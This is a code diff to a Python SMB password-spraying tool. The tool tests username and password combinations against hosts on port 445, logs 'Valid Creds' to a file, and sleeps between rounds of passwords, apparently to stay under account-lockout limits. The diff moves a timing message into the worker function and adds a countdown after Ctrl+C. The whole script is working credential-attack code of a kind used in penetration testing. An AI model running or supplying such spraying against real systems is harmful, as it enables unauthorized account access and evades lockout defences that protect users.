@@ -97,7 +97,7 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
                     f.write('{} {} {}\n'.format(remoteName.ljust(20), upasscombo.ljust(30), "Valid Creds"))
                     f.close()
 
-def mt_execute(username, host_ip, passwd):  # multithreading requires a function
+def mt_execute(username, host_ip, passwd, doit):  # multithreading requires a function
     try:
         sendit(username, passwd, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
     except Exception as e:
@@ -109,6 +109,13 @@ def mt_execute(username, host_ip, passwd):  # multithreading requires a function
 
     if options.delay is not None:
         sleep(options.delay)
+
+    if doit == True:
+        sleep(1)
+        currtime = datetime.datetime.now()
+        exptime = datetime.timedelta(minutes=options.pd)
+        newtime = currtime + exptime
+        print("Hit our max see you in {} mins from {} will resume at {}".format(options.pd, currtime.strftime("%H:%M:%S"), newtime.strftime("%H:%M:%S")))
 
 
 if __name__ == '__main__':
@@ -229,29 +236,32 @@ if __name__ == '__main__':
     if options.delay is not None: # so that the delay cannot exceed timeout
         options.timeout = options.timeout + options.delay
     count = 0
+    doit = False
     if options.method == 'sequence':
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
             for curr_ip in addresses:
                 for password in password_list:
                     print('Trying password {}'.format(password))
                     for username in users_cleaned:
+                        if count+1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1: # in a sense if we are at the last password before our sleep and this is not the last password in the list and we are at the last username in the list we will set doit to true
+                            doit = True
                         try:
-                            out = thread_exe.schedule(mt_execute, (username,curr_ip,password,), timeout=options.timeout)
+                            out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
+                            doit = False
                         except Exception as e:
                             print(str(e))
                     count += 1
                     if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1: # second part basically ensures that the current password's index does not equal the end of the array to prevent a sleep when there is no need
                         count = 0
-                        sleep(10)
-                        currtime = datetime.datetime.now()
-                        exptime = datetime.timedelta(minutes=options.pd)
-                        newtime = currtime + exptime
-                        print("Hit our max see you in {} mins from {} will resume at {}".format(options.pd, currtime.strftime("%H:%M:%S"), newtime.strftime("%H:%M:%S")))
                         try:
                             sleep(options.pd * 60)
                         except KeyboardInterrupt as e:
-                            print('\nCTRL+C detected waiting 3 seconds to continue')
-                            sleep(3)
+                            print('\nCTRL+C detected continuing in 3')
+                            sleep(1)
+                            print('2')
+                            sleep(1)
+                            print('1')
+                            sleep(1)
                             continue
 
 
@@ -261,21 +271,23 @@ if __name__ == '__main__':
                 print('Trying password {}'.format(password))
                 for username in users_cleaned:
                     curr_ip = addresses[random.randint(0, len(addresses)-1)]
+                    if count + 1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1:
+                        doit = True
                     try:
-                        out = thread_exe.schedule(mt_execute, (username,curr_ip,password,), timeout=options.timeout)
+                        out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
+                        doit = False
                     except Exception as e:
                         print(str(e))
                 count += 1
                 if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1:
                     count = 0
-                    sleep(10)
-                    currtime = datetime.datetime.now()
-                    exptime = datetime.timedelta(minutes=options.pd)
-                    newtime = currtime + exptime
-                    print("Hit our max see you in {} mins from {} will resume at {}".format(options.pd, currtime.strftime("%H:%M:%S"), newtime.strftime("%H:%M:%S")))
                     try:
                         sleep(options.pd * 60)
                     except KeyboardInterrupt as e:
-                        print('\nCTRL+C detected waiting 3 seconds to continue')
-                        sleep(3)
+                        print('\nCTRL+C detected continuing in 3')
+                        sleep(1)
+                        print('2')
+                        sleep(1)
+                        print('1')
+                        sleep(1)
                         continue
